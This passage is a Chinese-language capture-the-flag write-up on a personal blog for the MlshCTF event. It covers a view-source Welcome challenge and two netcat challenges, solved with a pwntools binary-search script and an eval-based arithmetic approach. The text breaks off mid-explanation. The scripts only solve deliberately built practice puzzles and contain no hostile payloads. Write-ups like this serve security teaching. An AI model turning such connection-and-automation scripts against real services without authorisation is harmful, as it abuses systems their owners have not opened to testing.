@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Zerocatw">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/07/20/mlshctf-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="MlshCTF Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MlshCTF-Writeup">
+<meta property="og:url" content="http://example.com/2024/07/20/MlshCTF-Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MlshCTF Writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ7sTh4eA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1dVHn36p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyxPUnn6p.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk9dgVp6T.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyhaZ4a6T.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkzmNEa6T.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJjtdRllR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ44jRgxA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkwxaCgxA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BySuy1bl0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hympgy-l0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk2WH1We0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkpSUJ-gC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryHzFybl0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1Lc_kWeR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkgcjxZeC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ry7x0eblR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyDMG-bg0.jpg">
+<meta property="og:image" content="https://hackmd.io/_uploads/rytrWzMlC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1AtmMzxR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r14YCUXx0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1cj3jExR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkFxTjVxA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJZrY24l0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hy-gzLpeC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJzVfLTx0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ3hGUpx0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByA6zLpeR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1TCzUpxC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HywdQIpxR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJPFQITgC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkE9X8peC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hklqhm8TgC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ2aQ8agA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJU07IaxR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1TgNUTl0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJaxVL6xR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bkax4U6e0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJaxNUTe0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HynIVUaxC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S17kBUalC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkR5KNTpT.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk7AY4Taa.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1wh9E6aa.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkC_r7QDR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJVHLmQvA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1bLImmw0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk_gDQmP0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1OXwmXvR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1YDv7QDR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1yQu7XvA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkgUOXmv0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1UlcXmPC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyNjc77DR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HymzjX7vR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkoNhXXwR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ6O1NXDC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ3h1E7DC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkvGxNXvR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJHLQ47DA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJcAN4mDR.png">
+<meta property="article:published_time" content="2024-07-19T18:31:26.611Z">
+<meta property="article:author" content="Zerocatw">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rJ7sTh4eA.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/cat.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/cat.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            MlshCTF-Writeup -
+        
+        Zerocatw&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css?family=LXGW%20WenKai%20TC" rel="stylesheet">
+    
+    
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"20px","line_height":2,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"2.8rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":true,"family":"SweiGothicCJKtc-Medium","url":"https://fonts.googleapis.com/css?family=LXGW%20WenKai%20TC"},"english":{"enable":false,"family":"Hack","url":"https://cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"https://raw.githubusercontent.com/Zerocatw/Zerocatw.github.io/master/images/wallhaven.webp","dark":"https://raw.githubusercontent.com/Zerocatw/Zerocatw.github.io/master/images/wallhaven.webp"},"title":"Zerocatw's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#d1d1b6","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/7/19 20:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Zerocatw&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">MlshCTF-Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/cat.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Zerocatw</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-07-20 02:31:26</span>
+        <span class="mobile">2024-07-20 02:31:26</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Writeup/">Writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此為MlshCTF的Writeup<br>各類型出題者如下，有問題可+dc聯絡</p>
+<p>網站 : <a class="link" target="_blank" rel="noopener" href="https://ctf.mlshctf.site/">https://ctf.mlshctf.site/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Welcome、Crypto、Misc、Pwn :　catcat4561<br>Reverse : gogogo5327<br>Web : krin.xiao</p>
+<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><h3 id="Welcome-1"><a href="#Welcome-1" class="headerlink" title="Welcome"></a>Welcome</h3><p>點進網頁<a class="link" target="_blank" rel="noopener" href="https://ctf.mlshctf.site/">https://ctf.mlshctf.site/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>根據題目「網頁藏了一點咚咚」故猜測flag藏在網頁裡<br>按下f12查看網頁原始碼，依序點開查看，發現flag</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7sTh4eA.png" alt="image"></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Guess-a-Number"><a href="#Guess-a-Number" class="headerlink" title="Guess a Number"></a>Guess a Number</h3><p>這題有兩種解法</p>
+<h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>因為我沒限制時間，所以可以直接nc連進去後，透過手動輸入來猜數字(暴力破解)</p>
+<h4 id="解法2-預期解"><a href="#解法2-預期解" class="headerlink" title="解法2(預期解)"></a>解法2(預期解)</h4><ol>
+<li>把source code載下來觀察<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Try to guess a secret number!(1~10000000)"</span>)</span><br><span class="line">    secret = randint(<span class="number">1</span>, <span class="number">10000000</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num != secret :</span><br><span class="line">        num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> num &lt; secret :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Higher!"</span>)</span><br><span class="line">        <span class="keyword">elif</span> num &gt; secret : </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Lower!"</span>)</span><br><span class="line">        <span class="keyword">elif</span> num == secret :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Congratulations! You win!"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"Here is the flag : <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></table></figure></div>
+得知當每次我們nc連上去後，會產生一個隨機數字(secret)，範圍是1~10000000<br>之後會讀我們的輸入，當我們輸入的數字</li>
+</ol>
+<ul>
+<li>小於secret，輸出Higher!</li>
+<li>大於secret，輸出Lower!</li>
+<li>等於secret，輸出flag</li>
+</ul>
+<ol start="2">
+<li><p>讀懂題目後，可以來撰寫腳本來解決這題了，這裡會利用pwntools加上二分搜來解，流程如下 :<br> 1.先remote到目標主機<br> 2.利用迴圈重複輸入，並在輸入的過程使用二分搜，提高找到secret的效率</p>
+</li>
+<li><p>程式碼如下:<br>remote ip 記得更改為跟題目給的ip一樣</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"192.168.3.17"</span>, <span class="number">20001</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b"Try to guess a secret number!(1~10000000)\n"</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">down = <span class="number">1</span></span><br><span class="line">up = <span class="number">10000001</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> :</span><br><span class="line">    secret = r.recvline(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br><span class="line">    <span class="keyword">if</span> secret == <span class="string">b"Higher!\n"</span> :</span><br><span class="line">        down = i</span><br><span class="line">        i = (down + up) // <span class="number">2</span></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">elif</span> secret == <span class="string">b"Lower!\n"</span> :</span><br><span class="line">        up = i</span><br><span class="line">        i = (down + up) // <span class="number">2</span></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><p>這題一樣有兩種解法</p>
+<h4 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a>解法1</h4><p>因為我沒限制時間，所以可以直接nc連進去後，自行計算後手動輸入(暴力破解)</p>
+<h4 id="解法2-預期解-1"><a href="#解法2-預期解-1" class="headerlink" title="解法2(預期解)"></a>解法2(預期解)</h4><ol>
+<li>把source code下載後觀察<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"There are 100 math questions here, try to answer it."</span>)</span><br><span class="line">    operator = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>]</span><br><span class="line">    win = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">        num1 = randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">        num2 = randint(<span class="number">1</span>, <span class="number">100</span>) </span><br><span class="line">        randomnum = randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f'Question <span class="subst">{i}</span>: <span class="subst">{num1}</span><span class="subst">{operator[randomnum]}</span><span class="subst">{num2}</span>='</span>, end=<span class="string">""</span>)</span><br><span class="line">        string = <span class="built_in">str</span>(num1)+operator[randomnum]+<span class="built_in">str</span>(num2)</span><br><span class="line">        ans = <span class="built_in">eval</span>(string)</span><br><span class="line">        num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> num != ans :</span><br><span class="line">            win = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"Wrong answer! bye~"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> win :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Congratulations! You win!"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"Here is the flag : <span class="subst">{flag}</span>"</span>)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果覺得程式碼看不太懂，也可以透過直接nc，看他會輸出甚麼東西</span><br></pre></td></tr></table></figure></div>
+得知題目最一開始</li>
+</ol>
+<ul>
+<li>設了一個陣列(operator)，內容是”+、-、*”(加減乘)</li>
+<li>會隨機生成從1 ~ 100的兩個數字(num1、num2)</li>
+<li>還有一個從0 ~ 2的數字(randomnum)</li>
+</ul>
+<p>之後會輸出<code>num1 operator[randomnum] num2 </code><br>並利用eval算出<code>num1 operator[randomnum] num2 </code>的答案，並把答案記錄在ans變數裡 (程式碼第11行)<br>最後讀我們的輸入，如果輸入 != ans，那就會把win = 0<br>如果成功答完100題(win = 1)那就可以獲得flag</p>
+<ol start="2">
+<li>主要利用pwntools和eval函數來解決這題</li>
+</ol>
+<ul>
+<li><p>eval介紹 </p>
+<ul>
+<li>用途 :<br>  可直接給運算式，快速計算出運算式的結果</li>
